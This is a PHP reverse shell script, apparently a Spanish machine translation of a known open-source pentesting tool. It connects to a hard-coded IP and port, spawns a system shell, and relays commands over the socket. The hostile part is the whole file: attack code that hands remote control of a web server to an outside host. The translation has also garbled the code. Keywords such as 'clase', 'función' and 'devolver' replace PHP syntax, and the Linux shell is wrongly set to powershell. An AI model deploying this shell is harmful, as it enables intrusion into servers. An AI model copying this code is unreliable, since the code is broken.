<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requiere PHP v5.0.0 o superior.
// Funciona en sistemas operativos Linux, macOS y Windows.
// Consulta el script original en https://github.com/pentestmonkey/php-reverse-shell.
clase Shell {
    privado $addr = null;
    privado $puerto = nulo;
    privado $os = null;
    privado $shell = null;
    privado $descriptorspec = array(
        0 => array('pipe', 'r'), // el shell puede leer desde STDIN
        1 => array('pipe', 'w'), // el intérprete de comandos puede escribir en STDOUT
        2 => array('pipe', 'w') // el intérprete de comandos puede escribir en STDERR
    );
    privado $buffer = 1024; // tamaño del búfer de lectura/escritura
    privado $clen = 0; // longitud del comando
    privado $error = false; // error de lectura/escritura de flujo
    función pública __construct($addr, $port) {
        $this->addr = $addr;
        $este->puerto = $puerto;
    }
    función privada detectar() {
        $detectado = verdadero;
        if (stripos(PHP_OS, 'LINUX') !== false) { // lo mismo para macOS
            $this->os = 'LINUX';
            $this->shell = ' powershell ';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } demás {
            $detectado = falso;
            echo "SYS_ERROR: El sistema operativo subyacente no es compatible, el script se cerrará ahora...\n";
        }
        devolver $detectado;
    }
    función privada daemonize() {
        $salida = falso;
        Si (!existe_la_función('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() no existe, continuando...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: No se puede bifurcar el proceso padre, continuando...\n";
        } else if ($pid > 0) {
            $salida = verdadero;
            echo "DAEMONIZE: El proceso hijo se ha bifurcado correctamente, el proceso padre ahora saldrá...\n";
        } else if (posix_setsid() < 0) {
            // Una vez que se ejecute como demonio, ya no verá el volcado del script.
            echo "DAEMONIZE: Se bifurcó del proceso padre pero no se puede establecer un nuevo SID, se continúa como huérfano...\n";
        } demás {
            echo "DAEMONIZE: ¡Completado con éxito!\n";
        }
        devolver $salida;
    }
    función privada configuración() {
        @error_reporting(0);
        @set_time_limit(0); // No imponga el límite de tiempo de ejecución del script
        @umask(0); // establece los permisos de archivo/directorio: 666 para archivos y 777 para directorios
    }
    función privada dump($data) {
        $data = str_replace('<', '<', $data);
        $data = str_replace('>', '>', $data);
        echo $datos;
    }
    función privada leer($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suprimir un error al leer desde un flujo de bloqueo cerrado
            $this->error = true; // establecer indicador de error global
            echo "STRM_ERROR: No se puede leer desde ${name}, el script saldrá ahora...\n";
        }
        devolver $datos;
    }
    función privada write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suprimir un error al escribir en un flujo de bloqueo cerrado
            $this->error = true; // establecer indicador de error global
            echo "STRM_ERROR: No se puede escribir en ${name}, el script saldrá ahora...\n";
        }
        devolver $bytes;
    }
    // Método de lectura/escritura para flujos no bloqueantes
    función privada rw($input, $output, $iname, $oname) {
        mientras (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calcular la longitud del comando
            $this->dump($data); // volcado del script
        }
    }
    // Método de lectura/escritura para flujos bloqueantes (por ejemplo, para STDOUT y STDERR en sistemas operativos Windows)
    // Debemos leer la longitud exacta en bytes de un flujo y ni un solo byte más.
    función privada brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        Si ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // Por alguna razón, el sistema operativo Windows redirige la entrada estándar (STDIN) a la salida estándar (STDOUT).
            // Eso no nos gusta
            // Necesitamos descartar los datos del flujo
            mientras ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $tamaño -= $bytes;
            }
        }
        mientras ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $tamaño -= $bytes;
            $this->dump($data); // volcado del script
        }
    }
    función pública ejecutar() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- INICIO DEL SOCKET -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            si (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } demás {
                stream_set_blocking($socket, false); // establece el flujo del socket en modo no bloqueante | devuelve 'true' en sistemas operativos Windows

                // ----- INICIO DE LA CONSTRUCCIÓN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                si (!$process) {
                    echo "PROC_ERROR: No se puede iniciar el shell\n";
                } demás {
                    para cada ($pipes como $pipe) {
                        stream_set_blocking($pipe, false); // establece los flujos de shell en modo no bloqueante | devuelve 'false' en sistemas operativos Windows
                    }

                    // ----- COMIENZA EL TRABAJO -----
                    $estado = proc_get_status($proceso);
                    @fwrite($socket, "SOCKET: ¡El shell se ha conectado! PID: " . $status['pid'] . "\n");
                    hacer {
						$estado = proc_get_status($proceso);
                        if (feof($socket)) { // comprobar el final del archivo en SOCKET
                            echo "SOC_ERROR: La conexión con el shell ha finalizado\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) { // comprobar si hay fin de archivo en STDOUT o si el proceso aún se está ejecutando
                            echo "PROC_ERROR: El proceso de shell ha finalizado\n"; break; // feof() no funciona con flujos bloqueantes
                        } // usar proc_get_status() en su lugar
                        $streams = array(
                            'read' => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write' => null,
                            'excepto' => nulo
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // esperar cambios en el flujo | no esperará en sistemas operativos Windows
                        si ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() falló\n"; break;
                        } else if ($num_changed_streams > 0) {
                            si ($this->os === 'LINUX') {
                                if (in_array($socket , $streams['read'])) { $this->rw($socket , $pipes[0], 'SOCKET', 'STDIN' ); } // leer desde SOCKET y escribir en STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket , 'STDERR', 'SOCKET'); } // leer desde STDERR y escribir en SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket , 'STDOUT', 'SOCKET'); } // leer desde STDOUT y escribir en SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // El orden es importante
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket , $pipes[0], 'SOCKET', 'STDIN' ); } // leer desde SOCKET y escribir en STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket , 'STDERR', 'SOCKET'); } // leer desde STDERR y escribir en SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket , 'STDOUT', 'SOCKET'); } // leer desde STDOUT y escribir en SOCKET
                            }
                        }
                    } mientras (!$this->error);
                    // ------ FIN DEL TRABAJO ------

                    para cada ($pipes como $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ FIN DE LA CONSTRUCCIÓN ------

                fclose($socket);
            }
            // ------ FIN DEL CONECTOR ------

        }
    }
}
echo '<pre>';
// Cambie la dirección del host y/o el número de puerto según sea necesario.
$sh = new Shell(' 10.189.83.55 ', 9001 );
$sh->run();
unset($sh);
// El recolector de basura requiere PHP v5.3.0 o superior
// @gc_collect_cycles();
echo '</pre>';
?>
